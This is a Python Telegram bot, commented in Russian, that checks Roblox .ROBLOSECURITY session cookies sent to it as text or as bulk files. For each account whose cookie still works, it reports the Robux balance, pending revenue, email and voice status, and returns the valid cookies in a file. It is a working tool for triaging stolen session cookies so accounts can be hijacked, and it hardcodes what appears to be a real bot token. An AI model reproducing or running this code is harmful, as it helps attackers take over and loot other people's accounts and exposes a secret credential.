import telebot
import requests
import io
import re
from datetime import datetime
from flask import Flask
from threading import Thread

# === НАСТРОЙКИ ===
TOKEN = '8526516729:AAHxx09k48kWRk0U7q2AcFSCmEdg3TDcfEw'
bot = telebot.TeleBot(TOKEN)

app = Flask('')
@app.route('/')
def home(): return "Бот работает"

def run(): app.run(host='0.0.0.0', port=8080)
def keep_alive(): Thread(target=run).start()

def get_auth_data(cookies, headers):
    """Один запрос для получения CSRF и проверки жизни куки"""
    try:
        # Пытаемся получить CSRF через запрос, который его требует
        res = requests.post("https://auth.roblox.com/v2/logout", cookies=cookies, headers=headers)
        return res.headers.get("x-csrf-token")
    except: return None

def check_cookie(raw_text):
    # Вытаскиваем куки из любого мусора
    match = re.search(r"(_\|WARNING:-DO-NOT-SHARE-THIS\..+)", raw_text)
    if not match: return {"status": "invalid"}
    cookie = match.group(1).strip()
    
    cookies = {".ROBLOSECURITY": cookie}
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Referer": "https://www.roblox.com/"
    }
    
    try:
        # 1. Проверка авторизации
        u_req = requests.get("https://users.roblox.com/v1/users/authenticated", cookies=cookies, headers=headers, timeout=10)
        if u_req.status_code != 200: return {"status": "invalid"}
        u_id = u_req.json()['id']
        u_name = u_req.json()['name']

        # 2. Получаем CSRF (нужен для точных данных)
        csrf = get_auth_data(cookies, headers)
        if csrf: headers["X-CSRF-TOKEN"] = csrf

        # 3. Сбор данных (Пендинг, Баланс, Почта, Войс)
        # Баланс
        robux = requests.get(f"https://economy.roblox.com/v1/users/{u_id}/currency", cookies=cookies, headers=headers).json().get('robux', 0)
        
        # Пендинг (Revenue Summary)
        rev_res = requests.get(f"https://economy.roblox.com/v1/users/{u_id}/revenue/summary/30d", cookies=cookies, headers=headers).json()
        pending = rev_res.get('pendingRobux', 0)

        # Почта
        email_v = "❌"
        email_req = requests.get("https://accountsettings.roblox.com/v1/email", cookies=cookies, headers=headers).json()
        if email_req.get('verified'): email_v = "✅"

        # Войс
        voice_v = "❌"
        voice_req = requests.get("https://voice.roblox.com/v1/settings/is-voice-enabled", cookies=cookies, headers=headers).json()
        if voice_req.get('isVoiceEnabled'): voice_v = "✅"

        return {
            "status": "ok", "name": u_name, "id": u_id, "robux": robux,
            "pending": pending, "email": email_v, "voice": voice_v, "cookie": cookie
        }
    except Exception as e:
        print(f"Ошибка: {e}")
        return {"status": "error"}

def format_output(res):
    return (
        f"👤 Аккаунт: {res['name']} (ID: {res['id']})\n"
        f"📧 Почта: {res['email']} | 🎤 Voice: {res['voice']}\n"
        f"💰 Баланс: {res['robux']} R$ (+{res['pending']} Pending)\n\n"
        f"🍪 КУКИ:\n`{res['cookie']}`\n"
        f"{'='*30}\n"
    )

@bot.message_handler(content_types=['text', 'document'])
def handle(message):
    try:
        if message.content_type == 'text' and len(message.text) > 100:
            res = check_cookie(message.text)
            if res['status'] == 'ok':
                bot.reply_to(message, format_output(res), parse_mode="Markdown")
            else:
                bot.reply_to(message, "❌ Невалидный куки.")
        
        elif message.content_type == 'document':
            file_info = bot.get_file(message.document.file_id)
            content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
            lines = [l.strip() for l in content.splitlines() if l.strip()]
            
            bot.send_message(message.chat.id, f"⌛ Чек {len(lines)} строк...")
            results = []
            for l in lines:
                res = check_cookie(l)
                if res['status'] == 'ok':
                    results.append(format_output(res))
            
            if results:
                buf = io.BytesIO("".join(results).encode('utf-8'))
                buf.name = "checked.txt"
                bot.send_document(message.chat.id, buf)
            else:
                bot.send_message(message.chat.id, "❌ Валид не найден.")
    except Exception as e:
        print(f"Ошибка в хендлере: {e}")

if __name__ == '__main__':
    keep_alive()
    bot.infinity_polling()
